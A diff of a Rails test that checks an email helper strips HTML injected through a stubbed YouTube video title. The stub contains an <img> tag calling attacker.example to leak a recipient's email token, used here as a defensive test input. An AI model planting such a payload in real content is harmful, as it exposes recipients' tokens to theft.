@@ -242,7 +242,7 @@ class EventsTest < ActiveSupport::TestCase
     create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
     video = Struct.new(:title).new('<img src="https://attacker.example/x?t=%recipient.token%"> & more')
     Yt::Video.stub(:new, video) do
-      html = EmailHelper.replace_youtube_oembeds(@event.extra_info_for_ticket_email)
+      html = EmailHelper.rich_text(@event.extra_info_for_ticket_email)
 
       refute_match(/<img[^>]*attacker\.example/, html)
       refute_includes html, '%recipient.token%'
